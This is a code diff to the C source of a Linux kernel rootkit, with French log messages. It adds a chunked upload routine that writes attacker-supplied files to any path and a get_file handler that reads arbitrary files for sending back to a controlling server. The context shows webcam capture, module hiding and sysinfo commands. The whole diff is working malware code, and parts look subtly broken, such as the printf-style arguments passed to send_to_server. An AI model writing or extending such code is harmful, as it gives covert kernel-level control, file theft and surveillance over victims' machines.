@@ -20,6 +20,13 @@
 
 extern struct socket *get_worker_socket(void);
 
+
+static bool receiving_file = false;
+static char *upload_path = NULL;
+static char *upload_buffer = NULL;
+static long upload_size = 0;
+static long upload_received = 0;
+
 // Handler prototypes
 static int connect_handler(char *args);
 static int disconnect_handler(char *args);
@@ -108,6 +115,42 @@ static int help_handler(char *args) {
 }
 
 int rootkit_command(char *command, unsigned command_size) {
+    if (receiving_file) {
+        DBG_MSG("rootkit_command: réception chunk upload (%u octets)\n", command_size);
+    
+        int chunk_size = command_size;
+    
+        // Protéger le buffer
+        if (upload_received + chunk_size > upload_size)
+            chunk_size = upload_size - upload_received;
+    
+        memcpy(upload_buffer + upload_received, command, chunk_size);
+        upload_received += chunk_size;
+    
+        if (upload_received >= upload_size) {
+            DBG_MSG("rootkit_command: réception complète (%ld octets), écriture dans %s\n",
+                    upload_size, upload_path);
+    
+            struct file *filp = filp_open(upload_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (IS_ERR(filp)) {
+                ERR_MSG("rootkit_command: échec ouverture fichier\n");
+                send_to_server("❌ Erreur écriture fichier.\n");
+            } else {
+                kernel_write(filp, upload_buffer, upload_size, &filp->f_pos);
+                filp_close(filp, NULL);
+                send_to_server("✅ Fichier écrit avec succès.\n");
+                DBG_MSG("rootkit_command: fichier écrit et fermé\n");
+            }
+    
+            // Nettoyage
+            kfree(upload_path);
+            kfree(upload_buffer);
+            receiving_file = false;
+        }
+    
+        return 0;  // Ne traite pas comme commande normale
+    }
+    
     // Remove newline character if present
     command[strcspn(command, "\n")] = '\0';
 
@@ -379,60 +422,6 @@ static int unhide_module_handler(char *args) {
     return ret_code;
 }
 
-static int upload_handler(char *args) {
-    struct file *file;
-    int ret = 0;
-
-    DBG_MSG("upload_handler: writing encrypted file to %s\n", args);
-
-    file = filp_open(args, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (IS_ERR(file)) {
-        ERR_MSG("upload_handler: failed to open destination file\n");
-        send_to_server("Failed to open destination file\n");
-        return PTR_ERR(file);
-    }
-
-    while (true) {
-        char *enc_buf = kzalloc(UPLOAD_BLOCK_SIZE, GFP_KERNEL);
-        struct kvec vec = { .iov_base = enc_buf, .iov_len = UPLOAD_BLOCK_SIZE };
-        struct msghdr msg = { 0 };
-        int len = kernel_recvmsg(get_worker_socket(), &msg, &vec, 1, UPLOAD_BLOCK_SIZE, 0);
-
-        if (len <= 0) {
-            kfree(enc_buf);
-            break;
-        }
-
-        // EOF detection
-        if (len >= 4 && !memcmp(enc_buf + len - 4, "EOF\n", 4)) {
-            len -= 4;
-            if (len == 0) {
-                kfree(enc_buf);
-                break;
-            }
-        }
-
-        char *dec_buf = NULL;
-        size_t dec_len = 0;
-        ret = decrypt_buffer(enc_buf, len, &dec_buf, &dec_len);
-        kfree(enc_buf);
-
-        if (ret != 0 || !dec_buf || dec_len == 0) {
-            ERR_MSG("upload_handler: decryption failed\n");
-            send_to_server("Decryption failed\n");
-            ret = -EINVAL;
-            break;
-        }
-
-        kernel_write(file, dec_buf, dec_len, &file->f_pos);
-        kfree(dec_buf);
-    }
-
-    filp_close(file, NULL);
-    send_to_server("Upload completed successfully\n");
-    return ret;
-}
-
 // Command to start the webcam and capture an image
 static int start_webcam_handler(char *args) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
@@ -540,5 +529,101 @@ static int sysinfo_handler(char *args) {
 
     send_to_server(info);
     kfree(info);
+    return 0;
+}
+
+static int upload_handler(char *args) {
+    char *path_str = strsep(&args, " ");
+    char *size_str = args;
+
+    DBG_MSG("upload_handler: reçu avec args = '%s' et '%s'\n", path_str, size_str);
+
+    if (!path_str || !size_str) {
+        ERR_MSG("upload_handler: mauvais format d'arguments\n");
+        send_to_server("Usage: upload <remote_path> <size>\n");
+        return -EINVAL;
+    }
+
+    long size;
+    if (kstrtol(size_str, 10, &size) < 0 || size <= 0) {
+        ERR_MSG("upload_handler: taille invalide : %s\n", size_str);
+        send_to_server("❌ Taille invalide.\n");
+        return -EINVAL;
+    }
+
+    if (receiving_file) {
+        ERR_MSG("upload_handler: tentative d'upload alors qu'un autre est en cours\n");
+        send_to_server("❌ Upload déjà en cours.\n");
+        return -EBUSY;
+    }
+
+    upload_path = kstrdup(path_str, GFP_KERNEL);
+    if (!upload_path) {
+        ERR_MSG("upload_handler: échec kstrdup\n");
+        send_to_server("❌ Erreur allocation chemin.\n");
+        return -ENOMEM;
+    }
+
+    upload_buffer = kmalloc(size, GFP_KERNEL);
+    if (!upload_buffer) {
+        ERR_MSG("upload_handler: échec allocation buffer (%ld octets)\n", size);
+        kfree(upload_path);
+        send_to_server("❌ Erreur allocation mémoire fichier.\n");
+        return -ENOMEM;
+    }
+
+    upload_size = size;
+    upload_received = 0;
+    receiving_file = true;
+
+    DBG_MSG("upload_handler: prêt à recevoir %ld octets vers %s\n", size, upload_path);
+    send_to_server("READY");
+    return 0;
+}
+
+static int get_file_handler(char *args) {
+    if (!args || !*args) {
+        send_to_server("Usage: get_file <path>\n");
+        return -EINVAL;
+    }
+
+    DBG_MSG("get_file_handler: lecture fichier %s\n", args);
+
+    struct file *filp = filp_open(args, O_RDONLY, 0);
+    if (IS_ERR(filp)) {
+        ERR_MSG("get_file_handler: impossible d’ouvrir %s\n", args);
+        send_to_server("❌ Impossible d’ouvrir le fichier.\n");
+        return PTR_ERR(filp);
+    }
+
+    loff_t pos = 0;
+    int size = i_size_read(file_inode(filp));
+
+    if (size <= 0) {
+        filp_close(filp, NULL);
+        send_to_server("❌ Fichier vide ou erreur.\n");
+        return -EINVAL;
+    }
+
+    // Allouer et lire le fichier
+    char *buffer = kmalloc(size, GFP_KERNEL);
+    if (!buffer) {
+        filp_close(filp, NULL);
+        send_to_server("❌ Mémoire insuffisante.\n");
+        return -ENOMEM;
+    }
+
+    kernel_read(filp, buffer, size, &pos);
+    filp_close(filp, NULL);
+
+    // Stocker pour envoi après "READY"
+    upload_buffer = buffer;
+    upload_size = size;
+    upload_received = 0;
+    receiving_file = false;
+
+    send_to_server("SIZE %d\n", size);
+    DBG_MSG("get_file_handler: prêt à envoyer %d octets\n", size);
+
     return 0;
 }
